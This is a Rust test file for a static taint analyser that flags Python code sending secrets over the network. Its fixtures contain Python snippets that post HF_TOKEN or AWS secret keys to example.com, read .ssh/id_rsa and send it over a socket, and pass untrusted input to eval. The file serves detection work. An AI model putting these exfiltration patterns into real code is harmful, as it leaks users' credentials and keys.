use anyhow::Result;
use layerfault::python_static::limits::PythonAnalysisLimits;
use layerfault::python_static::{analyze, analyze_and_convert_findings};
use std::collections::BTreeSet;
use std::time::Instant;

#[test]
fn test_env_to_requests_body_flow() -> Result<()> {
    let code = r#"
import os
import requests

token = os.environ["HF_TOKEN"]
requests.post("https://example.com/api", data=token)
"#;

    let auto_map = BTreeSet::new();
    let limits = PythonAnalysisLimits::default();
    let analysis = analyze("model.py", code, "digest1", &auto_map, &limits)?;

    assert_eq!(analysis.taint_result.flows.len(), 1);
    let flow = &analysis.taint_result.flows[0];
    assert_eq!(flow.source_line, 5);
    assert_eq!(flow.sink_line, 6);

    let findings = analyze_and_convert_findings(
        "model.py",
        code,
        "digest1",
        &auto_map,
        &limits,
        Instant::now(),
    )?;
    assert!(findings
        .iter()
        .any(|f| f.rule_id.as_deref() == Some("LF-PY-FLOW-CREDENTIAL-NETWORK")));

    Ok(())
}

#[test]
fn test_env_to_auth_header_flow() -> Result<()> {
    let code = r#"
import os
import requests

secret = os.getenv("AWS_SECRET_ACCESS_KEY")
headers = {"Authorization": f"Bearer {secret}"}
requests.get("https://example.com/data", headers=headers)
"#;

    let auto_map = BTreeSet::new();
    let limits = PythonAnalysisLimits::default();
    let analysis = analyze("handler.py", code, "digest2", &auto_map, &limits)?;

    assert!(!analysis.taint_result.flows.is_empty());
    let findings = analyze_and_convert_findings(
        "handler.py",
        code,
        "digest2",
        &auto_map,
        &limits,
        Instant::now(),
    )?;
    assert!(findings
        .iter()
        .any(|f| f.rule_id.as_deref() == Some("LF-PY-FLOW-CREDENTIAL-NETWORK")));

    Ok(())
}

#[test]
fn test_secret_file_to_network_flow() -> Result<()> {
    let code = r#"
import socket

key = open(".ssh/id_rsa").read()
s = socket.socket()
s.send(key)
"#;

    let auto_map = BTreeSet::new();
    let limits = PythonAnalysisLimits::default();
    let analysis = analyze("loader.py", code, "digest3", &auto_map, &limits)?;

    assert_eq!(analysis.taint_result.flows.len(), 1);
    let findings = analyze_and_convert_findings(
        "loader.py",
        code,
        "digest3",
        &auto_map,
        &limits,
        Instant::now(),
    )?;
    assert!(findings
        .iter()
        .any(|f| f.rule_id.as_deref() == Some("LF-PY-FLOW-FILE-NETWORK")));

    Ok(())
}

#[test]
fn test_fstring_list_dict_propagation() -> Result<()> {
    let code = r#"
import os
import requests

raw = os.environ["TOKEN"]
d = {"token": raw}
lst = [d["token"]]
msg = f"key={lst[0]}"
requests.post("https://example.com", data=msg)
"#;

    let auto_map = BTreeSet::new();
    let limits = PythonAnalysisLimits::default();
    let analysis = analyze("prop.py", code, "digest4", &auto_map, &limits)?;

    assert!(!analysis.taint_result.flows.is_empty());
    let findings = analyze_and_convert_findings(
        "prop.py",
        code,
        "digest4",
        &auto_map,
        &limits,
        Instant::now(),
    )?;
    assert!(findings
        .iter()
        .any(|f| f.rule_id.as_deref() == Some("LF-PY-FLOW-CREDENTIAL-NETWORK")));

    Ok(())
}

#[test]
fn test_two_unrelated_capabilities_no_false_flow() -> Result<()> {
    let code = r#"
import os
import requests

token = os.environ["HF_TOKEN"]
requests.get("https://example.com", data="clean_static_constant")
"#;

    let auto_map = BTreeSet::new();
    let limits = PythonAnalysisLimits::default();
    let analysis = analyze("unrelated.py", code, "digest5", &auto_map, &limits)?;

    assert!(analysis.taint_result.flows.is_empty());
    let findings = analyze_and_convert_findings(
        "unrelated.py",
        code,
        "digest5",
        &auto_map,
        &limits,
        Instant::now(),
    )?;
    assert!(!findings.iter().any(|f| f
        .rule_id
        .as_deref()
        .unwrap_or_default()
        .starts_with("LF-PY-FLOW-")));

    Ok(())
}

#[test]
fn test_overwrite_clears_flow() -> Result<()> {
    let code = r#"
import os
import requests

x = os.environ["HF_TOKEN"]
x = "clean_constant_value"
requests.post("https://example.com", data=x)
"#;

    let auto_map = BTreeSet::new();
    let limits = PythonAnalysisLimits::default();
    let analysis = analyze("overwrite.py", code, "digest6", &auto_map, &limits)?;

    assert!(analysis.taint_result.flows.is_empty());
    let findings = analyze_and_convert_findings(
        "overwrite.py",
        code,
        "digest6",
        &auto_map,
        &limits,
        Instant::now(),
    )?;
    assert!(!findings.iter().any(|f| f
        .rule_id
        .as_deref()
        .unwrap_or_default()
        .starts_with("LF-PY-FLOW-")));

    Ok(())
}

#[test]
fn test_untrusted_parameter_to_exec_flow() -> Result<()> {
    let code = r#"
def custom_loader(payload):
    eval(payload)
"#;

    let mut auto_map = BTreeSet::new();
    auto_map.insert("custom_loader".to_owned());
    let limits = PythonAnalysisLimits::default();

    let findings = analyze_and_convert_findings(
        "custom_loader.py",
        code,
        "digest7",
        &auto_map,
        &limits,
        Instant::now(),
    )?;
    assert!(findings
        .iter()
        .any(|f| f.rule_id.as_deref() == Some("LF-PY-FLOW-INPUT-EXEC")));

    Ok(())
}

#[test]
fn test_recursion_cycle_limit() -> Result<()> {
    let code = r#"
def recursive_func(x):
    return recursive_func(x)
"#;

    let auto_map = BTreeSet::new();
    let limits = PythonAnalysisLimits::default();
    let analysis = analyze("cycle.py", code, "digest8", &auto_map, &limits)?;

    assert!(analysis.taint_result.flows.is_empty());
    Ok(())
}

#[test]
fn test_dynamic_call_incomplete_not_fake_flow() -> Result<()> {
    let code = r#"
import os

t = os.environ["HF_TOKEN"]
fn = getattr(mod, "dispatch")
fn(t)
"#;

    let auto_map = BTreeSet::new();
    let limits = PythonAnalysisLimits::default();
    let analysis = analyze("dynamic.py", code, "digest9", &auto_map, &limits)?;

    assert!(analysis.taint_result.incomplete);
    let findings = analyze_and_convert_findings(
        "dynamic.py",
        code,
        "digest9",
        &auto_map,
        &limits,
        Instant::now(),
    )?;
    assert!(findings
        .iter()
        .any(|f| f.rule_id.as_deref() == Some("LF-PY-TAINT-INCOMPLETE")));

    Ok(())
}

#[test]
fn test_ast_taint_budget_exhaustion() -> Result<()> {
    let code = r#"
import os
import requests

t = os.environ["HF_TOKEN"]
requests.post("https://example.com", data=t)
"#;

    let auto_map = BTreeSet::new();
    let limits = PythonAnalysisLimits {
        max_taint_flows_per_file: 0,
        ..PythonAnalysisLimits::default()
    };

    let analysis = analyze("budget.py", code, "digest10", &auto_map, &limits)?;
    assert!(analysis.taint_result.incomplete);

    let findings = analyze_and_convert_findings(
        "budget.py",
        code,
        "digest10",
        &auto_map,
        &limits,
        Instant::now(),
    )?;
    assert!(findings
        .iter()
        .any(|f| f.rule_id.as_deref() == Some("LF-PY-TAINT-INCOMPLETE")));

    Ok(())
}

#[test]
fn test_evidence_redaction() -> Result<()> {
    let code = r#"
import os
import requests

secret_val = "sk-live-1234567890abcdef"
token = os.getenv("HF_TOKEN")
requests.post("https://example.com", data=token)
"#;

    let auto_map = BTreeSet::new();
    let limits = PythonAnalysisLimits::default();
    let findings = analyze_and_convert_findings(
        "redact.py",
        code,
        "digest11",
        &auto_map,
        &limits,
        Instant::now(),
    )?;

    for finding in findings {
        let detail_str = finding.detail.as_deref().unwrap_or_default();
        assert!(!detail_str.contains("sk-live-1234567890abcdef"));
    }

    Ok(())
}
